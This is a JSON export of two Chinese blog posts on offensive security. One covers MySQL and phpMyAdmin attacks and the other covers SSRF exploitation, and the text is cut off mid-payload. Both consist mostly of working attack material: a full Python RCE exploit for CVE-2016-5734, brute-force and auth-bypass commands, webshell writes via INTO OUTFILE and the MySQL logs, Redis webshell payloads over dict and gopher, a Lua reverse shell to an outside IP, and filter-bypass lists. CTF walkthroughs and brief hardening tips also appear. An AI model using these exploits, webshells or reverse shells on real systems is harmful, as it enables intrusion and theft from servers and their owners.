[{"content":"Mysql弱口令 mysql服务默认配置只允许本地登录root用户\n1 port=\u0026#34;3306\u0026#34; 1.使用数据库账号密码爆破工具直接进行爆破，如Tscan\n2.使用MSF的数据库利用模块进行爆破\n1 2 3 4 5 6 7 8 9 10 msf6 \u0026gt; use auxiliary/scanner/mysql/mysql_login msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set RHOSTS 192.168.1.145 RHOSTS =\u0026gt; 192.168.1.145 msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set user_file user.txt user_file =\u0026gt; user.txt msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set pass_file passwd.txt pass_file =\u0026gt; passwd.txt msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set STOP_NO_SUCCESS true [!] Unknown datastore option: STOP_NO_SUCCESS. Did you mean STOP_ON_SUCCESS?STOP_NO_SUCCESS =\u0026gt; true msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; exploit Mysql 未授权访问（CVE-2012-2122） 安全科班大四学生渗透学习DAY1 身份绕过CVE-2012-2122-CSDN博客\n1 2 3 4 5 6 7 for i in `seq 1 1000`; do mysql -h 127.0.0.1 -P 3306 -uroot -p123 2\u0026gt;/dev/null done use auxiliary/scanner/mysql/mysql_authbypass_hashdump set rhost 127.0.0.1 exploit 将解出的密码拿去解密即可\nPhpMyadmin利用 1 inurl:phpmyadmin 【攻防实战】phpmyadmin-RCE集锦\nCVE-2016-5734 影响版本：phpMyAdmin 4.0.x—4.6.2\n访问phpmyadmin,并登录，密码和用户名都是root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #!/usr/bin/env python \u0026#34;\u0026#34;\u0026#34;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7. CVE: CVE-2016-5734 Author: https://twitter.com/iamsecurity run: ./cve-2016-5734.py -u root --pwd=\u0026#34;\u0026#34; http://localhost/pma -c \u0026#34;system(\u0026#39;ls -lua\u0026#39;);\u0026#34; \u0026#34;\u0026#34;\u0026#34; import requests import argparse import sys __author__ = \u0026#34;@iamsecurity\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;url\u0026#34;, type=str, help=\u0026#34;URL with path to PMA\u0026#34;) parser.add_argument(\u0026#34;-c\u0026#34;, \u0026#34;--cmd\u0026#34;, type=str, help=\u0026#34;PHP command(s) to eval()\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True, type=str, help=\u0026#34;Valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--pwd\u0026#34;, required=True, type=str, help=\u0026#34;Password for valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--dbs\u0026#34;, type=str, help=\u0026#34;Existing database at a server\u0026#34;) parser.add_argument(\u0026#34;-T\u0026#34;, \u0026#34;--table\u0026#34;, type=str, help=\u0026#34;Custom table name for exploit.\u0026#34;) arguments = parser.parse_args() url_to_pma = arguments.url uname = arguments.user upass = arguments.pwd if arguments.dbs: db = arguments.dbs else: db = \u0026#34;test\u0026#34; token = False custom_table = False if arguments.table: custom_table = True table = arguments.table else: table = \u0026#34;prgpwn\u0026#34; if arguments.cmd: payload = arguments.cmd else: payload = \u0026#34;system(\u0026#39;uname -a\u0026#39;);\u0026#34; size = 32 s = requests.Session() # you can manually add proxy support it\u0026#39;s very simple ; # s.proxies = {\u0026#39;http\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;, \u0026#39;https\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;} s.verify = False sql = \u0026#39;\u0026#39;\u0026#39;CREATE TABLE `{0}` ( `first` varchar(10) CHARACTER SET utf8 NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `{0}` (`first`) VALUES (UNHEX(\u0026#39;302F6500\u0026#39;)); \u0026#39;\u0026#39;\u0026#39;.format(table) # get_token resp = s.post(url_to_pma + \u0026#34;/?lang=en\u0026#34;, dict( pma_username=uname, pma_password=upass )) if resp.status_code is 200: token_place = resp.text.find(\u0026#34;token=\u0026#34;) + 6 token = resp.text[token_place:token_place + 32] if token is False: print(\u0026#34;Cannot get valid authorization token.\u0026#34;) sys.exit(1) if custom_table is False: data = { \u0026#34;is_js_confirmed\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;db\u0026#34;: db, \u0026#34;token\u0026#34;: token, \u0026#34;pos\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sql_query\u0026#34;: sql, \u0026#34;sql_delimiter\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;show_query\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;fk_checks\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;SQL\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;ajax_page_request\u0026#34;: \u0026#34;true\u0026#34;, } resp = s.post(url_to_pma + \u0026#34;/import.php\u0026#34;, data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if \u0026#34;success\u0026#34; in resp.json(): if resp.json()[\u0026#34;success\u0026#34;] is False: first = resp.json()[\u0026#34;error\u0026#34;][resp.json()[\u0026#34;error\u0026#34;].find(\u0026#34;\u0026lt;code\u0026gt;\u0026#34;)+6:] error = first[:first.find(\u0026#34;\u0026lt;/code\u0026gt;\u0026#34;)] if \u0026#34;already exists\u0026#34; in error: print(error) else: print(\u0026#34;ERROR: \u0026#34; + error) sys.exit(1) # build exploit exploit = { \u0026#34;db\u0026#34;: db, \u0026#34;table\u0026#34;: table, \u0026#34;token\u0026#34;: token, \u0026#34;goto\u0026#34;: \u0026#34;sql.php\u0026#34;, \u0026#34;find\u0026#34;: \u0026#34;0/e\\0\u0026#34;, \u0026#34;replaceWith\u0026#34;: payload, \u0026#34;columnIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;useRegex\u0026#34;: \u0026#34;on\u0026#34;, \u0026#34;submit\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34; } resp = s.post( url_to_pma + \u0026#34;/tbl_find_replace.php\u0026#34;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies) ) if resp.status_code == 200: result = resp.json()[\u0026#34;message\u0026#34;][resp.json()[\u0026#34;message\u0026#34;].find(\u0026#34;\u0026lt;/a\u0026gt;\u0026#34;)+8:] if len(result): print(\u0026#34;result: \u0026#34; + result) sys.exit(0) print( \u0026#34;Exploit failed!\\n\u0026#34; \u0026#34;Try to manually set exploit parameters like --table, --database and --token.\\n\u0026#34; \u0026#34;Remember that servers with PHP version greater than 5.4.6\u0026#34; \u0026#34; is not exploitable, because of warning about null byte in regexp\u0026#34; ) sys.exit(1) 1 python .\\CVE-2016-5734.py -u root -p root http://192.168.165.41:8080/ -c \u0026#34;system(\u0026#39;cat /etc/passwd\u0026#39;)\u0026#34; CVE-2018-12613 phpmyadmin4.8.1任意文件读取漏洞\n1 http://192.168.0.108:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 漏洞深度利用\n1 SELECT \u0026#39;\u0026lt;?php phpinfo()?\u0026gt;\u0026#39; //执行phpinfo命令 利用文件包含包含日志文件\n1 2 3 http://192.168.0.104:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_5587bc62c8c09503e2882a8594d89ff7 //5587bc62c8c09503e2882a8594d89ff7 Cookie值 WooYun-2016-199433 phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /scripts/setup.php HTTP/1.1 Host: 192.168.0.104:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Referer: http://192.168.0.104:8080/ Cookie: phpMyAdmin=5587bc62c8c09503e2882a8594d89ff7; pma_lang=zh_CN Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 80 action=test\u0026amp;configuration=O:10:\u0026#34;PMA_Config\u0026#34;:1:{s:6:\u0026#34;source\u0026#34;,s:11:\u0026#34;/etc/passwd\u0026#34;;} PhpMyadmin后台弱口令GetShell phpmyadmin页面getshell-腾讯云开发者社区-腾讯云\nselect into outfile直接写入 前提利用条件：\n对Web目录需要有写权限能够使用单引号（Root） 知道网站绝对路径（报错页面/Phpinfo/Php探针） secure_file_priv没有具体值 1 show global variables like \u0026#39;%secure%\u0026#39;; //查看secure_file_priv 关于secure_file_priv，****secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限\n1 2 3 当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权 secure_file_priv这个值是只读变量，只能通过配置文件修改。\n1 2 3 4 show variables like \u0026#34;%plugin%\u0026#34;; //查看mysql安装目录 //写入1句话木马 select \u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#39; INTO OUTFILE \u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\b.php\u0026#39; 利用全局日志写Shell 查看mysql的日志状态，默认是关闭的，因为这个日志的量非常大对资源是一个比较大的开销\n1 2 3 SHOW VARIABLES LIKE \u0026#39;%general%\u0026#39; general_log_file为日志保存的位置 开启general_log模式 开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在general_log_file的文件中，其实就是我们常说的****日志文件\n利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用 这里注意：在修改log路径前，源路径一定要提前记录下来，我们获取shell后还要恢复原来的路径\n1 2 3 4 5 6 set global general_log = on; //修改日志目录为shell地址 set global general_log_file=\u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\webapp.php\u0026#39;; //在日志文件中写入Shell select \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39; 慢查询Getshell 慢日志：一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值(默认为10秒)，这个查询语句将被记录到慢查询日志中。\n1 2 show global variables like \u0026#39;%long_query_time%\u0026#39; show global variables like \u0026#39;%long%\u0026#39; 1 2 查看慢日志参数 show global variables like \u0026#39;%slow%\u0026#39; 1 2 3 4 set global slow_query_log=1 # 打开慢日志 set global slow_query_log_file=\u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\webbpp.php\u0026#39;\t# 慢日志的路径【注意：一定要用双反斜杠】 SELECT \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; or sleep(11)\t# 这儿11是超过慢日志的10秒时间 SELECT \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; or sleep(11)\t","date":"2025-06-14T11:08:54+08:00","image":"https://lserein.github.io/p/mysql%E6%94%BB%E9%98%B2/mysql_hu_41fa5258407fda18.jpg","permalink":"https://lserein.github.io/p/mysql%E6%94%BB%E9%98%B2/","title":"Mysql攻防"},{"content":"外部表现：Dnslog平台可以接收到服务器的请求，但是不是存在这种现象就代表存在漏洞，是否存在漏洞取决于能否利用，如有道词典https://fanyi.youdao.com/#/TextTranslate\n是一种由攻击者构造形成由服务器端发起的请求的一个安全漏洞，URL可控\n1 2 3 4 5 6 7 8 9 10 轻则访问内网拓扑，网段，内网信息收集 高可getshell，文件读取 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0223955 QQ空间SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0215779 小米SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214331 华为SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214261 有道SSRF漏洞绕过 1.http://10.100.21.7.xip.io 2.http://www.10.100.21.7.xip.name 3.http://t.im/14tjq 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); } $url = $_GET[\u0026#39;url\u0026#39;]; curl($url); ?\u0026gt; 对于SSRF类漏洞首先需要先尝试协议，看那种协议能够正常使用\n发现网站疑似存在SSRF漏洞先判断网站是否在云上，在云上可以尝试获取元数据\nSSRF半自动化挖掘 SSRF-King https://github.com/ethicalhackingplayground/ssrf-king\n直接扩展导入Jar包，在仪表盘中将扫描范围设置成如下图所示\nBurp扫描配置\u0026mdash;扫描设定里面\ncollaborator-everywhere bp开启拦截他会自动添加参数\nSSRF漏洞深度利用 注意：SSRF利用伪协议攻击内网IP时需要对数据进行URL二次编码，防止特殊个数数据影响执行和传输\nhttps://blog.csdn.net/csjjjd/article/details/140654737\n如果Dnslog地址能够成功获取到请求，表明服务器支持上述协议，如何判断SSRF是有回显SSRF还是无回显SSRF，只需要插入对应网站，查看网页能否正常加载\nhttp协议 1 2 3 4 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=http://mk1d.callback.red #探测内网192.168.10.1上3306端口，如果开放会有对应反馈 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=http://192.168.10.1:3306 如果想批量探测内网存活端口，只需要使用Burp的Intruder模块进行爆破\n1 2 3 4 5 6 7 8 9 GET /vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306 HTTP/1.1 Host: 111.229.71.77 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://111.229.71.77/vul/ssrf/ssrf_curl.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close dict协议 字典服务器协议，访问字典资源。对传入的后缀文件有大小现限制。探测内网端口和服务一般使用http和dict协议，dict协议本身能够发送数据，dict协议扫描端口速度快\n1 2 3 4 5 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://fc8k.callback.red http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:22 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://ip:6739/info 使用dict探测端口是否开放，如果目标网站开放端口，会返回端口所提供的服务的部分组件信息\n如果目标端口关闭则不会产生任何提示\n写Webshell\n1 2 3 4 5 6 7 8 9 dict://192.168.0.100:6379/flushall //更新 dict://192.168.0.100:6379/config:set:dir:/var/www/html //设置webshell上传路径 dict://192.168.0.100:6379/config:set:dbfilename:webshell.php //设置写入文件 dict://192.168.0.100:6379/set:webshell:\u0026#34;123456\u0026#34; //设置写入内容，最后将内容进行编码，否则容易乱码 dict://192.168.0.100:6379/set:webshell:\u0026#34;十六进制一句话木马\u0026#34; dict://192.168.0.100:6379/save //保存 dict://192.168.0.100:6379/keys * //查看写入的文件 dict://192.168.0.100:6379/get webshell file协议 从文件中获取目标服务器的文件内容，不支持Dnslog回显\n1 2 3 4 5 6 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=file:///var/www/html/flag.php file:///etc/hosts #显示当前操作系统网卡的IP file:///proc/net/arp #显示arp缓存表(寻找内网其他主机) file:///proc/net/fib_trie #显示当前网段路由信息 Gopher协议 https://zhuanlan.zhihu.com/p/112055947 gopher协议详解\nhttps://github.com/tarunkant/Gopherus 工具项目地址\nhttps://github.com/firebroo/sec_tools/tree/master/redis-over-gopher 工具\nhttps://blog.csdn.net/weixin_39633252/article/details/113229123 ssrf攻击内网mysql\n分布式文档传递服务，可传入data\n1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=gopher://mq9c.callback.red Gopher协议攻击内网Redis 方案1：写Webshell\n1 2 3 4 5 6 7 8 攻击前提：redis弱密码或无密码 知道网站根目录 目录有写入权限 python2 gopherus.py --exploit redis gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 生成后的payload最好在做一次url编码，从下划线开始 方案2：计划任务反弹shell\n方案3：写lua脚本getshell\nLua项目下SSRF利用Redis文件覆盖lua回显RCE\n1 2 ##LUA_START##os.execute(\u0026#34;/bin/bash -c \u0026#39;sh -i %26\u0026gt;/dev/tcp/120.24.186.57/1234 0\u0026gt;%261\u0026#39;\u0026#34;)##LUA_END## 那么可以通过gopher协议覆盖/scripts/visit.script⽂件，写⼊lua代码去反弹shell\n1 2 3 4 5 6 7 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D% 0A%241%0D%0A1%0D%0A%24101%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22/bin/bash%20 -c%20%27sh%20- i%20%26%3E/dev/tcp/120.24.186.57/1234%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D% 0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scr ipts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D% 0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A ldap协议 轻量级目录访问协议\n1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=ldap://jndi.callback.red:5/in4y/ tftp协议 1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=tftp://xxx.callback.red 绕过方法 https://mp.weixin.qq.com/s/p1ldAOlQ_gVB3w1bm0lQ7g\nSSRF漏洞特征在于请求包中存在url地址，这些特征会引起Waf/态势感知设备的告警\n1 2 3 #使用字符拼接进行绕过 http://192.168.0.102/ssrf.php?url=http://192.168.0.100.sslip.io:22 http://192.168.0.102/ssrf.php?url=http://hahahahhahahhah.la12.callback.red 环回地址绕过 1 2 3 4 5 6 7 环回地址绕过： http://[::1] http:/[::] http://[::]:8o/ http://g000::1:80/ http://127.1 http://0 进制绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /点分十进制 127.0.0.1 //八进制（也可以加点） 0177000000001 http://0000::1:80/ 0177.886.000.801 /十六进制 0x7F000001 0x7F.0x00.0x00.0x01 0x7F.00.00.01 /十进制 2130706433 //二进制 0b01111111000000000000000000000001 locathost 黑名单编码绕过 302重定向绕过 1 http://challenge-4d170753d38888ec.sandbox.ctfhub.com:10800/?url=http://www.baidu.com@0x7F.00.00.01/flag.php url参数滥用绕过（@/#） 1 2 # ---\u0026gt; url编码%23 ---\u0026gt;双url编码%2523 @ DNS重绑定 https://lock.cmpxchg8b.com/rebinder.html DNS重绑定在线网址\nhttps://zhuanlan.zhihu.com/p/89426041 浅谈DNS重绑定漏洞\nSSRF漏洞加固防御 1 2 3 将一些不用的协议禁止加入黑名单：dict,file,gopher,tftp... 内网IP设置白名单 端口IP限制，内网高危端口22，3306，6379限制 CTF中SSRF漏洞常规利用 https://www.ctfhub.com/#/skilltree CTF在线SSRF漏洞利用\nhttps://www.nssctf.cn/problem/2011\nhttps://www.cnblogs.com/lhqrusht0p/p/18017007\n填写需要curl的网站会直接跳转到网站首页，使用DNSlog进行探测，发现存在回显\n对网站进行伪协议攻击,发现可以使用file伪协议\n读取flag，提示存在ha1x1ux1u.php文件\n访问该文件，进行代码审计，还是个存在SSRF漏洞的代码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = $_GET[\u0026#34;file\u0026#34;]; if (stristr($file, \u0026#34;file\u0026#34;)){ die(\u0026#34;你败了.\u0026#34;); } //flag in /flag echo file_get_contents($file); [Hitcon 2017]SSRFme https://blog.csdn.net/qq_59471040/article/details/144250739\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php // 如果存在HTTP_X_FORWARDED_FOR头，则获取X-Forwarded-For头的内容 if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $http_x_headers = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); // 将第一个IP地址设置为REMOTE_ADDR，这可能导致IP伪造 $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $http_x_headers[0]; } // 输出当前的REMOTE_ADDR，即用户的真实IP地址 echo $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; // 根据用户IP和固定字符串创建一个目录名，并尝试创建这个目录 $sandbox = \u0026#34;sandbox/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($sandbox); @chdir($sandbox); // 执行一个GET请求，获取用户指定URL的内容，并将其赋值给$data变量 // 这里存在一个命令注入的风险，因为$data变量直接用于shell_exec函数 $data = shell_exec(\u0026#34;GET \u0026#34; . escapeshellarg($_GET[\u0026#34;url\u0026#34;])); // 获取用户指定文件名的路径信息 $info = pathinfo($_GET[\u0026#34;filename\u0026#34;]); // 将路径中的点（.）替换为空，这可能是为了防止创建带有点的目录 $dir = str_replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;, basename($info[\u0026#34;dirname\u0026#34;])); // 创建目录并进入该目录 @mkdir($dir); @chdir($dir); // 将获取的数据保存为文件，文件名为用户指定的文件名 @file_put_contents(basename($info[\u0026#34;basename\u0026#34;]), $data); // 高亮显示当前文件的代码，这通常用于调试 highlight_file(__FILE__); ?\u0026gt; CTFHub\u0026mdash;POST请求\u0026mdash;考点gopher协议发送post请求 https://mp.weixin.qq.com/s/ElNAouUg0jpRhfgeE8zRkw\n题目描述：****这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年\n先尝试协议，看哪些协议能够支持，读取index.php文件\n读取flag.php文件\n使用gopher发送请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import urllib.parse payload =\\ \u0026#34;\u0026#34;\u0026#34;POST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=86a31efba632022b9e1883caa06858a9 \u0026#34;\u0026#34;\u0026#34; #注意后面一定要有回车，回车结尾表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace(\u0026#39;%0A\u0026#39;,\u0026#39;%0D%0A\u0026#39;) result = \u0026#39;gopher://127.0.0.1:80/\u0026#39;+\u0026#39;_\u0026#39;+new result = urllib.parse.quote(result) print(result) 这个生成的payload最好二次url编码一下\n1 2 3 4 5 6 7 8 9 GET /?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D86a31efba632022b9e1883caa06858a9%2520%250D%250A HTTP/1.1 Host: challenge-c77475fa1b5a0319.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i CTFHub\u0026mdash;上传文件 https://mp.weixin.qq.com/s/d2r8JHUisxhhARLl3b-Yrg\n访问flag.php,上传文件抓取数据包，没用提交按钮，需要修改html代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 POST /flag.php HTTP/1.1 Host: challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------199908452239551894662987264031 Content-Length: 350 Origin: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 Connection: close Referer: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php Upgrade-Insecure-Requests: 1 Priority: u=0, i -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;\u0026#34; Content-Type: application/octet-stream -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; 提交查询 -----------------------------199908452239551894662987264031-- 将代码使用python脚本生成payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import urllib.parse payload =\\ \u0026#34;\u0026#34;\u0026#34;POST /flag.php HTTP/1.1 Host: challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------199908452239551894662987264031 Content-Length: 350 Origin: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 Connection: close Referer: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php Upgrade-Insecure-Requests: 1 Priority: u=0, i -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;\u0026#34; Content-Type: application/octet-stream -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; 提交查询 -----------------------------199908452239551894662987264031-- \u0026#34;\u0026#34;\u0026#34; #注意后面一定要有回车，回车结尾表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace(\u0026#39;%0A\u0026#39;,\u0026#39;%0D%0A\u0026#39;) result = \u0026#39;gopher://127.0.0.1:80/\u0026#39;+\u0026#39;_\u0026#39;+new result = urllib.parse.quote(result) print(result) 1 2 3 4 5 6 7 8 9 GET /?url=gopher%3A//127.0.0.1%3A80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A92.0)%2520Gecko%252F20100101%2520Firefox%252F92.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------3899987496969232395467070377%250D%250AContent-Length%253A%2520388%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-fdbaeb80bf490fcb.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%25